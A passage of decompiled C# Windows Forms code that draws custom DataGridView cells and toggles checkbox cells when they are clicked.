						new Point(rect2.Right - 3, rect2.Top + 3)
					});
					using Pen pen3 = new Pen(color2, 2f);
					e.Graphics.DrawPath(pen3, graphicsPath2);
				}
			}
			else if (e.Value != null)
			{
				TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
			}
		}
	}

	private void DGVPRIMB_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		DataGridView dGVC = DGVC;
		DataGridViewColumn dataGridViewColumn = dGVC.Columns[e.ColumnIndex];
		if (dataGridViewColumn is DataGridViewCheckBoxColumn)
		{
			DataGridViewCell dataGridViewCell = dGVC.Rows[e.RowIndex].Cells[e.ColumnIndex];
			bool flag = false;
			if (dataGridViewCell.Value != null && !Information.IsDBNull(RuntimeHelpers.GetObjectValue(dataGridViewCell.Value)))
			{
				flag = Conversions.ToBoolean(dataGridViewCell.Value);
			}
			dataGridViewCell.Value = !flag;
			dGVC.InvalidateCell(e.ColumnIndex, e.RowIndex);
		}
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__142_002D0()
	{
		AV = null;
	}
}
